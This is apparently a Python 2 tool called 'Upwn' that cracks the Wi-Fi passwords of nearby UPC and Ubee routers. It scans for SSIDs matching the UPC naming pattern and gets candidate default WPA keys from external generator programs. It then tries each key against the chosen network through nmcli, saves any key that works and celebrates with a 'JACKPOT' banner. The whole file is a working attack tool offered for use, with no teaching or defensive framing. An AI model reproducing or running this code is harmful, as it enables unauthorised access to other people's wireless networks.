from time import sleep
from subprocess import CalledProcessError
import subprocess
import re
import os
import sys
import time
import signal
import pickle

OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'


class Upwn(object):
    ap_list = []
    mac_list = []
    saap = []
    sapp = []
    sbap = []
    testall = []
    ubeekeys = []
    ghz = 24
    whatyearisit = 0
    cntaps = 0
    allkeys = 0
    listnr = 0
    wifi_interface = ''

    """
    PROGRAM LOGIC, function calls
    """
    @staticmethod
    def menu():
        Upwn.checkroot()
        Upwn.banner()
        aps, macs, ubees, ghz = Upwn.getaps()
        Upwn.getsetiface()
        Upwn.listnr = Upwn.setap(aps, macs)
        Upwn.setghz(ghz, Upwn.listnr)

        isubee = Upwn.checkubee(ubees, Upwn.listnr)
        Upwn.saap = Upwn.gen_keys(Upwn.listnr, 'SAAP')
        Upwn.sapp = Upwn.gen_keys(Upwn.listnr, 'SAPP')
        Upwn.sbap = Upwn.gen_keys(Upwn.listnr, 'SBAP')
        Upwn.testall = Upwn.saap + Upwn.sapp + Upwn.sbap

        prefix = Upwn.serials()
        Upwn.ubeekeys = Upwn.gen_keys(Upwn.listnr, 'UAAP')
        keys = Upwn.gen_keys(Upwn.listnr, prefix)
        Upwn.cntkeys(isubee, Upwn.ubeekeys, keys)
        Upwn.pretest(Upwn.listnr, keys, Upwn.ubeekeys)
        Upwn.deadend()

    '''
    SET GHZ
    '''
    @staticmethod
    def setghz(ghz, listnr):
        if int(ghz[listnr][:2]) == 24:
            Upwn.ghz = 1
            print OKGREEN + '[+] ' + "2.4 Ghz \tdetected" + ENDC
        else:
            Upwn.ghz = 2
            print OKGREEN + '[+] ' + "5 Ghz \tdetected" + ENDC

    '''
    CHECK IF AP IS UBEE
    '''
    @staticmethod
    def checkubee(ubees, listnr):
        for item in ubees:
            if item == listnr:
                print OKGREEN + '[+] ' + "UBEE router detected" + ENDC
                return 1
        return 0

    '''
    COUNT AND DISPLAY FOUND KEYS
    '''
    @staticmethod
    def cntkeys(isubee, ubeekeys, keys):
        print OKGREEN + "\nAvailable keys:" + ENDC

        if isubee:
            for item in ubeekeys:
                print OKGREEN + '[+] ' + ENDC + item
                Upwn.allkeys += 1
        else:
            Upwn.ubeekeys = []

        for item in keys:
            print OKGREEN + '[+] ' + ENDC + item
            Upwn.allkeys += 1

    '''
    GET APs
    '''
    @staticmethod
    def getaps():
        aps = []
        macs = []
        ubees = []
        ghz = []
        cnt = 0

        nmcli = subprocess.check_output(["nmcli", "-f", "SSID,BSSID,FREQ", "d", "wifi"], stderr=open(os.devnull, 'w'))
        aps_macs_ghz = re.compile('(UPC+\d{7}).+(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w).+(\d{4})').findall(nmcli)
        aps_macs_ghz = set(aps_macs_ghz)

        for item in aps_macs_ghz:
            aps.append(item[0])
            macs.append(item[1])
            ghz.append(item[2])
            if item[1][:8] == '64:7C:34':
                ubees.append(cnt)
            cnt += 1

        # exit if no UPC router is found
        if not aps:
            print FAIL + "[!] No vulnerable UPC routers found!" + ENDC
            print FAIL + "[+] Are you sure there are UPC routers around?" + ENDC
            print FAIL + "[+] If yes, try turning your WIFI off and on again." + ENDC
            print FAIL + "[+] Also try using a better Wifi dongle if the problem persists.\n" + ENDC
            exit(1)

        return aps, macs, ubees, ghz

    '''
    SET WIFI INTERFACE
    '''
    @staticmethod
    def getsetiface():
        print OKGREEN + "Wifi Interfaces found:" + ENDC

        iwconfig = subprocess.check_output("iwconfig", stderr=open(os.devnull, 'w'))
        interfaces = re.compile('(wlp\d\S+)').findall(iwconfig)

        i = 0
        for item in interfaces:
            if i == 0:
                print '[' + str(i) + ']  ' + str(item) + " (default)"
                i += 1
            else:
                print '[' + str(i) + ']  ' + str(item)
                i += 1

        while True:
            try:
                response = raw_input(WARNING + "\nselect interface: " + ENDC)
                if response == '':
                    Upwn.wifi_interface = interfaces[0]
                    break
                elif int(response) < i:
                    Upwn.wifi_interface = interfaces[int(response)]
                    break
            except ValueError:
                pass

            print "Incorrect input, try again"
        print OKGREEN + "[+]" + ENDC + " testing via " + str(Upwn.wifi_interface) + "\n"

    '''
    SET AP
    '''
    @staticmethod
    def setap(aps, macs):
        found = {}
        if os.path.isfile('found.p'):
            p = open('found.p', 'r')

            reverse = {}
            while True:
                try:
                    reverse[pickle.load(p)] = pickle.load(p)
                    found = {v: k for k, v in reverse.items()}
                except EOFError:
                    break

            p.close()

        print OKGREEN + "\nAvailable UPC routers:" + ENDC
        i = 0
        key = ''
        for item in aps:

            try:
                if found[item]:
                    key = "  KEY: " + OKGREEN + found[item] + ENDC
            except KeyError:
                key = ''
                pass

            Upwn.ap_list.append(item)
            if i == 0:
                print "[" + str(i) + "] " + str(item) + " (default)" + key
            else:
                print "[" + str(i) + "] " + str(item) + "\t\t" + key
            Upwn.cntaps += 1
            i += 1

        for item in macs:
            Upwn.mac_list.append(item)

        listnr = 0
        while True:
            try:
                response = raw_input(WARNING + "\nselect router: " + ENDC)
                if response == '':
                    print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + "  selected"
                    break
                elif int(response) < Upwn.cntaps:
                    listnr = int(response)
                    print OKGREEN + "[+] " + ENDC + Upwn.ap_list[listnr] + "  selected"
                    break
            except ValueError:
                pass

            print "Incorrect input, try again"
        return listnr

    '''
    SET PREFIX
    '''
    @staticmethod
    def serials():
        print OKGREEN + "\n\nAvailable serial prefixes:" + ENDC
        print "[0] SAAP {" + str(len(Upwn.saap)) + "} (default)"
        print "[1] SAPP {" + str(len(Upwn.sapp)) + "}"
        print "[2] SBAP {" + str(len(Upwn.sbap)) + "}"
        print "[3] all  {" + str(len(Upwn.testall)) + "}"

        while True:
            try:
                response = raw_input(WARNING + "\nselect prefix: " + ENDC)

                if response == '':
                    print OKGREEN + "[+] " + ENDC + "using SAAP\n"
                    prefix = 'SAAP'
                    break
                elif int(response) == 0:
                    print OKGREEN + "[+] " + ENDC + "using SAAP\n"
                    prefix = 'SAAP'
                    break
                elif int(response) == 1:
                    print OKGREEN + "[+] " + ENDC + "using SAPP\n"
                    prefix = 'SAPP'
                    break
                elif int(response) == 2:
                    print OKGREEN + "[+] " + ENDC + "using SBAP\n"
                    prefix = 'SBAP'
                    break
                elif int(response) == 3:
                    print OKGREEN + "[+] " + ENDC + "using SAAP,SAPP,SBAP\n"
                    prefix = 'SAAP,SAPP,SBAP'
                    break
            except ValueError:
                pass

            print "Incorrect input, try again"
        return prefix

    '''
    GET KEYS
    '''
    @staticmethod
    def gen_keys(aplistnr, prefix):
        keys = []
        found = 0
        ubeekeys = ''

        # UAAP == UBEE
        if prefix == "UAAP":
            mac = str(Upwn.mac_list[aplistnr]).replace(':', '')[6:]

            # hack for non zero return
            try:
                ubee = subprocess.check_output(["./ubee", mac], stderr=open(os.devnull, 'w'))
            except CalledProcessError as ex:
                ubee = ex.output

            ubeelines = ubee.splitlines()
            for line in ubeelines:
                if Upwn.ap_list[aplistnr] in line:
                    ubeekeys = re.compile('([A-Z]{8})').findall(line)
                    found += 1

            if found == 0:
                ubeekeys = re.compile('([A-Z]{8})').findall(ubee)

            return ubeekeys

        # the rest
        output = subprocess.check_output(["./upc_keys_lambda", Upwn.ap_list[aplistnr], prefix],
                                         stderr=open(os.devnull, 'w')).replace('\'', '')
        lines = output.splitlines()
        keys_ = (Upwn.key_collector(lines))

        for item in keys_:
            keys.append(item)
        return keys

    '''
    COLLECT KEYS
    '''
    @staticmethod
    def key_collector(keys):
        collect = []

        if Upwn.ghz == 3:
            for item in keys:
                parts = item.split(',')
                collect.append(parts[1])
        else:
            for item in keys:
                parts = item.split(',')
                if parts[2] == str(Upwn.ghz):
                    collect.append(parts[1])
        return collect

    '''
    TEST THE KEYS?
    '''
    @staticmethod
    def pretest(listnr, keys, ubeekeys):
        while True:
            try:
                response = raw_input(WARNING + "\nTry " + str(Upwn.allkeys) + " keys now? [" + Upwn.ap_list[listnr] +
                                     "] (Y/n): " + ENDC)

                if response in 'Yy' or '':
                    if keys and ubeekeys:
                        keys.insert(0, ubeekeys[0])

                    Upwn.keytest(listnr, keys, Upwn.wifi_interface)
                    break

                elif response in 'Nn':
                    exit(0)
            except ValueError:
                pass

            print "Incorrect input, try again"

    '''
    NMCLI MAGIC
    '''
    @staticmethod
    def keytest(aplistnr, key, interface):
        cnt = 0
        subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
                         #stderr=open(os.devnull, 'wb'))
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for item in key:
            cnt += 1
            start_time = time.time()
            sys.stdout.write(OKGREEN + "\n[?] " + ENDC + item)
            sleep(2)

            #p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item, 'ifname', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                p = subprocess.check_output(['nmcli', 'device', 'wifi', 'connect', Upwn.ap_list[aplistnr], 'password', item, 'ifname', interface])

                Upwn.waiter(5)
                if "successfully activated" in p:
                    Upwn.whatyearisit += (time.time() - start_time)

                    f = open('found.p', 'a')
                    pickle.dump(Upwn.ap_list[Upwn.listnr], f)
                    pickle.dump(item, f)
                    f.close()

                    Upwn.win(aplistnr, item)

            except CalledProcessError:
                pass

            sys.stdout.write(FAIL + "[X]" + ENDC)
            subprocess.Popen(['nmcli', 'connection', 'delete', 'id', Upwn.ap_list[aplistnr]],
                             #stderr=open(os.devnull, 'wb'))
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            Upwn.whatyearisit += (time.time() - start_time)
            sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(Upwn.allkeys) + "]")
        print

    '''
    DEADEND
    '''
    @staticmethod
    def deadend():
        Upwn.allkeys = 0
        Upwn.whatyearisit = 0

        Upwn.fail()
        response = raw_input(WARNING + "\nRetry? (Y/n): " + ENDC)

        if response in 'Yy' or '':
            Upwn.menu()
        else:
            exit(0)

    '''
    WAIT FOR IT.. now with dots
    '''
    @staticmethod
    def waiter(howlong):
        i = 1
        while i <= howlong:
            sys.stdout.write('.')
            sys.stdout.flush()
            sleep(1)
            i += 1

    '''
    ARE YOU ROOT?
    '''
    @staticmethod
    def checkroot():
        if os.getuid() != 0:
            print "You need root permissions to run this program"
            sys.exit(1)

    '''
    SIGNAL HANDLING
    '''
    @staticmethod
    def signal_handler(signal, frame):
        # f = open('pending.p', 'a')
        # pickle.dump(Upwn.ap_list[Upwn.listnr], f)
        # pickle.dump(Upwn.saap, f)
        # pickle.dump(Upwn.sapp, f)
        # pickle.dump(Upwn.sbap, f)
        # f.close()

        # p = open('pending.p', 'r')
        # ap = pickle.load(p)
        # saap = pickle.load(p)
        # sapp = pickle.load(p)
        # sbap = pickle.load(p)

        # print ap
        # print saap
        # print sapp
        # print sbap

        exit(0)

    '''
    DEAD
    '''
    @staticmethod
    def fail():
        print "          _____                    _____                    _____                    _____           "
        print "         /\    \                  /\    \                  /\    \                  /\    \          "
        print "        /::\    \                /::\    \                /::\    \                /::\    \         "
        print "       /::::\    \              /::::\    \              /::::\    \              /::::\    \        "
        print "      /::::::\    \            /::::::\    \            /::::::\    \            /::::::\    \       "
        print "     /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \      "
        print "    /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/  \:::\    \     "
        print "   /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    \:::\    \    "
        print "  /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    / \:::\    \   "
        print " /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/    /   \:::\ ___\  "
        print "/:::/____/     \:::|    |/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/____/     \:::|    | "
        print "\:::\    \     /:::|____|\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\:::\    \     /:::|____| "
        print " \:::\    \   /:::/    /  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \:::\    \   /:::/    /  "
        print "  \:::\    \ /:::/    /    \:::\   \:::\    \               \::::::/    /    \:::\    \ /:::/    /   "
        print "   \:::\    /:::/    /      \:::\   \:::\____\               \::::/    /      \:::\    /:::/    /    "
        print "    \:::\  /:::/    /        \:::\   \::/    /               /:::/    /        \:::\  /:::/    /     "
        print "     \:::\/:::/    /          \:::\   \/____/               /:::/    /          \:::\/:::/    /      "
        print "      \::::::/    /            \:::\    \                  /:::/    /            \::::::/    /       "
        print "       \::::/    /              \:::\____\                /:::/    /              \::::/    /        "
        print "        \::/____/                \::/    /                \::/    /                \::/____/         "
        print "         ~~                       \/____/                  \/____/                  ~~               "

    '''
    START THE ENGINES
    '''
    @staticmethod
    def banner():
        print WARNING + "           _________   _...._                      _..._   "
        print "           \        |.'      '-.         _     _ .'     '. "
        print "            \        .'```'.    '. /\    \\\\   //.   .-.   ."
        print "             \      |       \     \`\\\\  //\\\\ // |  '   '  |"
        print "   _    _     |     |        |    |  \`//  \\'/  |  |   |  |"
        print "  | '  / |    |      \      /    .    \|   |/   |  |   |  |"
        print " .' | .' |    |     |\`'-.-'   .'      '        |  |   |  |"
        print " /  | /  |    |     | '-....-'`                 |  |   |  |"
        print "|   `'.  |   .'     '.                          |  |   |  |"
        print "'   .'|  '/'-----------'                        |  |   |  |"
        print " `-'  `--'                                      '--'   '--'" + ENDC
        print "\n"

    '''
    WE WIN THIS TIME
    '''
    @staticmethod
    def win(aplistnr, key):
        print '\n\n'
        print '   $$$$$\   $$$$$$\    $$$$$$\  $$\    $$\ $$$$$$$\   $$$$$$\ $$$$$$$$\ '
        print '   \__$$ | $$  __$$\  $$  __$$\ $$ |  $$  |$$  __$$\ $$  __$$\\\\__$$  __|'
        print '      $$ | $$ /  $$ | $$ /  \__|$$ | $$  / $$ |  $$ |$$ /  $$ |  $$ |'
        print '      $$ | $$$$$$$$ | $$ |      $$$$$   /  $$$$$$$  |$$ |  $$ |  $$ |'
        print ' $$\  $$ | $$  __$$ | $$ |      $$  $$ <   $$  ____/ $$ |  $$ |  $$ |'
        print ' $$ | $$ | $$ |  $$ | $$ |  $$\ $$ | \$$\  $$ |      $$ |  $$ |  $$ |'
        print ' \$$$$$$ | $$ |  $$ | \$$$$$$  |$$ |  \$$\ $$ |       $$$$$$  |  $$ |'
        print ' \______ / \__|  \__|  \______/ \__|   \__|\__|       \______ /  \__|'

        print "\n\n"
        print " Key to the kingdom of " + Upwn.ap_list[aplistnr] + ":\t" + key
        print "\n\n The castle was defeated in " + str(Upwn.whatyearisit) + " seconds"
        exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, Upwn.signal_handler)
    Upwn.menu()
